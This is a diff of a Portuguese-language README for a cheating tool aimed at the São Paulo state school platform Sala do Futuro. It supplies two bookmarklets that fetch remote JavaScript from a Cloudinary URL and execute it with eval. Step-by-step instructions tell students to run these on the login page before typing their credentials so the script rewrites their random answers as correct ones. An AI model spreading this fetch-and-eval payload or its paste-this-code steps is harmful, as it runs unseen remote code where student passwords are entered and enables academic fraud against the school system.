@@ -1,37 +1,34 @@
 # 🚀 HCK - PROVA PAULISTA 
 
-### HCK - PROVA PAULISTA:
+## HCK - PROVA PAULISTA:
 ```js
 javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/saladofuturo.js").then(t=>t.text()).then(eval);
 ```
-### HCK - TAREFAS:
-### INSTALAÇÃO:
-1. Clique nos três pontos no canto.
-2. No canto superior direito e clique na estrela.
-3. Clique na mensagem que aparecer embaixo.
-4. No campo Nome, escreva qualquer coisa.
-5. No campo URL ou Endereço, cole o código:
-
+## HCK - TAREFAS:
 ```js
 javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745790408/saladofuturov2.js").then(t=>t.text()).then(eval);
 ```
-### INFORMAÇÕES ADICIONAIS:
+## Instalação (TAREFAS)
 
-1. Execute o script antes de **efetuar o Login** no [Sala do Futuro](https://saladofuturo.educacao.sp.gov.br/login-alunos).
-2. **Depois de efetuado**, deve ir até a tarefa que você quer fazer.
-3. Responda **aleatoriamente** às questões da tarefa e envie.
-4. Logo depois, o script irá inserir todas às **respostas corretamente.**
+1. Clique nos **três pontinhos** no canto **superior direito** do navegador.
+2.Adicione o **site atual que estiver** aos favoritos (Ícone ⭐).
+3. Clique novamente nos **três pontinhos** e vá até **Favoritos**.
+4. Localize o **favorito que você salvou**, clique nos **três pontinhos** ao lado dele e **selecione Editar**.
+5. No **campo Nome**, coloque algo fácil de lembrar (ex: TAREFAS).
+6. No **campo URL**, apague o que estiver lá e cole o código do script que está logo acima **(HCK - TAREFAS).**
+7. **Salve as alterações**.
+8. Acesse a plataforma **[Sala do Futuro](https://saladofuturo.educacao.sp.gov.br/login-alunos)**
+9. **Antes de preencher** login e senha, apague a URL atual, **digite o nome do favorito que você salvou (ex: TAREFAS) e clique nele.**
+10. **Algumas notificações** vão aparecer no canto inferior da tela (normal), **depois disso faça o login normalmente**, entre na **tarefa que você quer fazer**, responda **tudo aleatoriamente e envie a tarefa**, após enviar o script **vai corrigir tudo automaticamente e responder todas corretamentes**.
 
-*Obs: O tempo da tarefa depende unicamente de quanto tempo você ficar na página dela antes de enviar.*
+## A questão do tempo, como fica?
+
+*R: Isso depende unicamente de quanto tempo você permanecer na página da tarefa antes de enviá-la.*
 
 ### [Discord: hackermoon](https://discord.gg/snWEnnWF)
 
-### Créditos:
+## Créditos:
 
-- [Inacallep](https://github.com/inacallep)
-
-- [Crackingnlearn](https://github.com/crackingnlearn)
-
-- [Miturufu](https://github.com/Miturufu)
-
-
+- [@inallep](https://github.com/inacallep)
+- [@crackingnlearn](https://github.com/crackingnlearn)
+- [@miturufu](https://github.com/Miturufu)
